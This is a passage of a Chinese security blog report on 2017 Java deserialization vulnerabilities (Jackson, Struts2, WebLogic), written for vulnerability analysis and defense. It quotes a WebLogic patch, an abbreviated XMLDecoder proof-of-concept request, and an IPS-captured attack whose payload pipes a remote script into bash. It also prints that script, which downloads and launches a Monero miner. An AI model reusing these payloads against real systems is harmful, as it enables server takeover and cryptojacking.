+<p>在clientName上方添加注解，打开支持多态的特性，这样我们就能指定clientName的类型；另一个是将clientName的类型改为Object类型，这样就避免了类型不匹配或者不是其子类的错误。<br>另外Jackson不是默认句柄，需要设置ContentTypeHandler，这样当Content-Type为application/json格式的请求都交给了JcaksonLibHandler来处理。具体的PoC就是Jackson的PoC，这里不再展示，详情分析见<a href="http://xxlegend.com/2017/12/06/S2-055%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%88%86%E6%9E%90/">5</a>。这个漏洞和S2-052非常类似，都是引用的第三方库存在缺陷导致的漏洞，这样的案例数不胜数，在Java生态中简直就是一个灾难，第三方依赖实在太多。</p>
+<h2 id="4-Weblogic"><a href="#4-Weblogic" class="headerlink" title="4 Weblogic"></a>4 Weblogic</h2><p>在2017年，整个Oracle的产品线都深受反序列化影响，其中Weblogic影响面尤其广泛，很多漏洞的CVSS评分都是9.8，9.9甚至为10。<br>!(weblogic)[/images/2017_4.png]<br>而且CVE-2017-3248的PoC已经在github上，并且被用于黑产，CVE-2017-10352 PoC也被泄露同样被用于黑产。</p>
+<p>###4.1 CVE-2017-3248 分析</p>
+<p>这个漏洞(CVE-2017-3248)就是利用rmi机制的缺陷，通过JRMP协议达到执行任意反序列化payload的目的。利用步骤可以分为两步，第一步建立JRMP监听端口，第二步执行反序列化操作，其反序列化内容指向外部的JRMP监听端口，这样在反序列的过程中就会从远程JRMP监听端口加载内容并执行序列化操作，详细的利用工具可以使用ysoserial。</p>
+<p>###4.2 CVE-2017-10352 分析</p>
+<p>这个漏洞是由于XMLDecoder这个缺陷库存在代码执行问题，同样也是由于被黑产利用而被大家广泛得知。其实在CVE-2017-3506中，Weblogic官方已经做了一次修补，只是当时的修补不够彻底，后来有研究员给Weblogic提供了绕过的PoC，Weblogic官方再次完整修补。同时这个PoC也被泄露，非常多的用户中招。</p>
+<h4 id="4-2-1-补丁"><a href="#4-2-1-补丁" class="headerlink" title="4.2.1 补丁"></a>4.2.1 补丁</h4><p>补丁的核心代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">validate</span><span class="params">(InputStream is)</span> </span>&#123;</div><div class="line">   WebLogicSAXParserFactory factory = <span class="keyword">new</span> WebLogicSAXParserFactory();</div><div class="line">   <span class="keyword">try</span> &#123;</div><div class="line">      SAXParser parser = factory.newSAXParser();</div><div class="line">      parser.parse(is, <span class="keyword">new</span> DefaultHandler() &#123;</div><div class="line">         <span class="keyword">private</span> <span class="keyword">int</span> overallarraylength = <span class="number">0</span>;</div><div class="line">         <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startElement</span><span class="params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXException </span>&#123;</div><div class="line">            <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"object"</span>)) &#123;</div><div class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:object"</span>);</div><div class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"new"</span>)) &#123;</div><div class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:new"</span>);</div><div class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"method"</span>)) &#123;</div><div class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:method"</span>);</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">               <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"void"</span>)) &#123;</div><div class="line">                  <span class="keyword">for</span>(<span class="keyword">int</span> attClass = <span class="number">0</span>; attClass &lt; attributes.getLength(); ++attClass) &#123;</div><div class="line">                     <span class="keyword">if</span>(!<span class="string">"index"</span>.equalsIgnoreCase(attributes.getQName(attClass))) &#123;</div><div class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid attribute for element void:"</span> + attributes.getQName(attClass));</div><div class="line">                     &#125;</div><div class="line">                  &#125;</div><div class="line">               &#125;</div><div class="line">               <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"array"</span>)) &#123;</div><div class="line">                  String var9 = attributes.getValue(<span class="string">"class"</span>);</div><div class="line">                  <span class="keyword">if</span>(var9 != <span class="keyword">null</span> &amp;&amp; !var9.equalsIgnoreCase(<span class="string">"byte"</span>)) &#123;</div><div class="line">                     <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"The value of class attribute is not valid for array element."</span>);</div><div class="line">                  &#125;</div></pre></td></tr></table></figure></p>
+<p>这个补丁限定了object，new,method,void，array等字段，就限定了不能生成java 实例。</p>
+<h4 id="4-2-2-分析"><a href="#4-2-2-分析" class="headerlink" title="4.2.2 分析"></a>4.2.2 分析</h4><p>根据补丁大概就得就能猜出相应的PoC，具体如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</div><div class="line">Host: 192.168.3.216:7001</div><div class="line">Accept-Encoding: identity</div><div class="line">Content-Length: 683</div><div class="line">Accept-Language: zh-CN,zh;q=0.8</div><div class="line">Accept: */*</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0</div><div class="line">Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3</div><div class="line">Connection: keep-alive</div><div class="line">Cache-Control: max-age=0</div><div class="line">Content-Type: text/xml</div><div class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</div><div class="line">  &lt;soapenv:Header&gt;</div><div class="line">    &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</div><div class="line">        &lt;java version=&quot;1.8.0_131&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</div><div class="line">          &lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</div><div class="line">            &lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</div><div class="line">              。。。。</div><div class="line">          &lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</div><div class="line">        &lt;/java&gt;</div><div class="line">      &lt;/work:WorkContext&gt;</div><div class="line">    &lt;/soapenv:Header&gt;</div><div class="line">  &lt;soapenv:Body/&gt;</div><div class="line">&lt;/soapenv:Envelope&gt;</div></pre></td></tr></table></figure></p>
+<p>在动态调试过程中这个调用栈非常深，我们简单解释一下关键的几个部位，首先是WorkContextServerTube.java中processRequest方法，主要功能就是分割整个xml，抽取真正执行的xml交给readHeadOld方法，也就是请求中soapenv:Header包裹的部分，这一部分最终会交给XMLDecoder，XMLDecoder完成数据到对象的转换，即会执行恶意代码。并且wls-wsat是一个特权应用，无需用户名密码验证，所以危害非常大。<br>更多详情分析可参考文档 <a href="http://blog.nsfocus.net/weblogic-xmldecoder-rce/" target="_blank" rel="external">6</a> , 同时绿盟科技这篇报告的英文版还被Java-Deserialization-Cheat-Sheet收录。</p>
+<h4 id="4-2-3-黑产利用"><a href="#4-2-3-黑产利用" class="headerlink" title="4.2.3 黑产利用"></a>4.2.3 黑产利用</h4><p>在绿盟的IPS设备或者蜜罐设备就能看到很多这种利用Weblogic XMLDecoder（CVE-2017-10352）进行黑产利用的特征，下面是绿盟IPS抓到的示例，具体如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">srcip为173.212.217.181</div><div class="line"></div><div class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1////0d////0aHost: 58.210.×.×:8001////0d////0aAccept-Encoding: identity////0d////0aContent-Length: 983////0d////0aAccept-Language: zh-CN,zh;q=0.8////0d////0aAccept: */*////0d////0aUser-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0////0d////0aAccept-Charset: GBK,utf-8;q=0.7,*;q=0.3////0d////0aConnection: keep-alive////0d////0aReferer: http://www.baidu.com////0d////0aCache-Control: max-age=0////0d////0aContent-Type: text/xml////0d////0a////0d////0a&lt;soapenv:Envelope xmlns:soapenv= http://schemas.xmlsoap.org/soap/envelope/ &gt;////0a          &lt;soapenv:Header&gt;////0a            &lt;work:WorkContext xmlns:work= http://bea.com/2004/06/soap/workarea/ &gt;////0a                &lt;java version= 1.8.0_131  class= java.beans.XMLDecoder &gt;////0a                  &lt;void class= java.lang.ProcessBuilder &gt;////0a                    &lt;array class= java.lang.String  length= 3 &gt;////0a                      &lt;void index= 0 &gt;////0a                        &lt;string&gt;/bin/bash&lt;/string&gt;////0a                      &lt;/void&gt;////0a                      &lt;void index= 1 &gt;////0a                        &lt;string&gt;-c&lt;/string&gt;////0a                      &lt;/void&gt;////0a                      &lt;void index= 2 &gt;////0a                        &lt;string&gt;wget -O - 191.101.180.74/robots.txt|bash&lt;/string&gt;////0a                      &lt;/void&gt;////0a                    &lt;/array&gt;////0a                  &lt;void method= start /&gt;&lt;/void&gt;////0a                &lt;/java&gt;////0a              &lt;/work:WorkContext&gt;////0a            &lt;/soapenv:Header&gt;////0a          &lt;soapenv:Body/&gt;////0a        &lt;/soapenv:Envelope&gt;</div></pre></td></tr></table></figure></p>
+<p>对于linux系统会去191.101.180.74下载一个bash脚本执行挖坑行为（门罗币）。这个robots.txt的核心内容如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">wget -q http://45.123.190.178/Silence -O /tmp/Silence</div><div class="line">curl -o /tmp/Silence http://45.123.190.178/Silence</div><div class="line"><span class="keyword">else</span></div><div class="line"><span class="built_in">exit</span> 0;</div><div class="line"><span class="keyword">fi</span></div><div class="line">chmod +x /tmp/Silence</div><div class="line">nohup /tmp/Silence -B <span class="_">-a</span> cryptonight -o stratum+tcp://xmr.crypto-pool.fr:80 -u 44pgg5mYVH6Gnc7gKfWGPR2CxfQLhwdrCPJGzLonwrSt5CKSeEy6izyjEnRn114HTU7AWFTp1SMZ6eqQfvrdeGWzUdrADDu -p x -R 1 &amp;&gt;&gt;/dev/null &amp;</div><div class="line">sleep 10</div><div class="line">rm -rf /tmp/Silence</div></pre></td></tr></table></figure></p>
+<p>对srcip：173.212.217.181溯源跟踪，从绿盟科技威胁情报中心NTI中的数据也能看出，该IP从2017年8月份开始，一直被用于特定漏洞扫描以便发现更多具有脆弱性的主机。!(nti数据)[/images/2017_5.png]</p>
+<p>#总结<br>从OWASP 2017 top ten报告中可以看出反序列化是一个业内都开始关注重视的漏洞类型，一个原因就是该漏洞很多时候都是通过黑名单的方式的修复，这就导致了层出不穷的绕过，从Jackson，fastjson，weblogic一见端倪，都是修复，绕过，再修复，再绕过，没有尽头。另外一个原因就是该漏洞的危害非常大，通常都是RCE，一个PoC直接获取系统权限，不管是黑产，灰产，开发，运维还有白帽安全人员都非常重视该类型的漏洞。从系统的重要性来看，国内很多商业系统都是基于Java框架开发，这些中间件或者Web容器一旦出现漏洞，整个系统都变得不堪一击，可能造成不可挽回的影响。<br>对于反序列漏洞的防御，业内也是一个难题，首先得确保所有的依赖库和容器已经更新到最新版本，这样能防止已知漏洞的攻击。另外绿盟科技的IPS，WAF都已经具备对这些漏洞的防护能力，更多的防护策略请参考绿盟科技下一篇关于反序列化漏洞防御的文档。</p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/反序列化/" rel="tag"># 反序列化</a>
+          
+            <a href="/tags/Struts2/" rel="tag"># Struts2</a>
+          
+            <a href="/tags/XStream/" rel="tag"># XStream</a>
+          
+            <a href="/tags/XMLDecoder/" rel="tag"># XMLDecoder</a>
+          
+            <a href="/tags/fastjson/" rel="tag"># fastjson</a>
+          
+            <a href="/tags/Jackson-fastjson-XStream-XMLDecoder-WebLogic-反序列化漏洞，年度报告/" rel="tag"># Jackson,fastjson,XStream,XMLDecoder,WebLogic,反序列化漏洞，年度报告</a>
+          
+            <a href="/tags/WebLogic/" rel="tag"># WebLogic</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/12/23/Weblogic XMLDecoder RCE分析/" rel="next" title="Weblogic XMLDecoder RCE分析">
+                <i class="fa fa-chevron-left"></i> Weblogic XMLDecoder RCE分析
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.png"
+               alt="廖新喜" />
+          <p class="site-author-name" itemprop="name">廖新喜</p>
+           
+              <p class="site-description motion-element" itemprop="description">分享些安全编码，漏洞分析</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">27</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              
+                <span class="site-state-item-count">15</span>
+                <span class="site-state-item-name">分类</span>
+              
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">105</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/shengqi158" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://twitter.com/shengqi158" target="_blank" title="Twitter">
+                  
+                    <i class="fa fa-fw fa-twitter"></i>
+                  
+                  Twitter
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/u/1900013681" target="_blank" title="Weibo">
+                  
+                    <i class="fa fa-fw fa-weibo"></i>
+                  
+                  Weibo
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#2017年反序列化漏洞年度报告"><span class="nav-number">1.</span> <span class="nav-text">2017年反序列化漏洞年度报告</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#背景"><span class="nav-number">2.</span> <span class="nav-text">背景</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#概述"><span class="nav-number">3.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#反序列化漏洞"><span class="nav-number">4.</span> <span class="nav-text">反序列化漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-fastjson反序列化漏洞"><span class="nav-number">4.1.</span> <span class="nav-text">1 fastjson反序列化漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-补丁"><span class="nav-number">4.1.1.</span> <span class="nav-text">1.1 补丁</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-初略分析"><span class="nav-number">4.1.2.</span> <span class="nav-text">1.2 初略分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-后续官方修补"><span class="nav-number">4.1.3.</span> <span class="nav-text">1.3 后续官方修补</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-Jackson反序列化"><span class="nav-number">4.2.</span> <span class="nav-text">2 Jackson反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-CVE-2017-7525"><span class="nav-number">4.2.1.</span> <span class="nav-text">2.1 CVE-2017-7525</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-1-分析"><span class="nav-number">4.2.2.</span> <span class="nav-text">2.1.1 分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#后续官方修补"><span class="nav-number">4.2.3.</span> <span class="nav-text">后续官方修补</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-Struts2"><span class="nav-number">4.3.</span> <span class="nav-text">3 Struts2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-S2-052分析"><span class="nav-number">4.3.1.</span> <span class="nav-text">3.1 S2-052分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#3-1-1-补丁"><span class="nav-number">4.3.1.1.</span> <span class="nav-text">3.1.1 补丁</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-1-2-分析"><span class="nav-number">4.3.1.2.</span> <span class="nav-text">3.1.2 分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-S2-055分析"><span class="nav-number">4.3.2.</span> <span class="nav-text">3.2 S2-055分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#S2-055补丁"><span class="nav-number">4.3.2.1.</span> <span class="nav-text">S2-055补丁</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#S2-055分析"><span class="nav-number">4.3.2.2.</span> <span class="nav-text">S2-055分析</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-Weblogic"><span class="nav-number">4.4.</span> <span class="nav-text">4 Weblogic</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#4-2-1-补丁"><span class="nav-number">4.4.0.1.</span> <span class="nav-text">4.2.1 补丁</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-2-2-分析"><span class="nav-number">4.4.0.2.</span> <span class="nav-text">4.2.2 分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-2-3-黑产利用"><span class="nav-number">4.4.0.3.</span> <span class="nav-text">4.2.3 黑产利用</span></a></li></ol></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">廖新喜</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://xxlegend-com.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'http://xxlegend.com/2018/01/25/2017年反序列化漏洞年度报告/';
+          this.page.identifier = '2018/01/25/2017年反序列化漏洞年度报告/';
+          this.page.title = '2017年反序列化漏洞年度报告';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://xxlegend-com.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (search_path.endsWith("json")) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      $('#local-search-input').focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
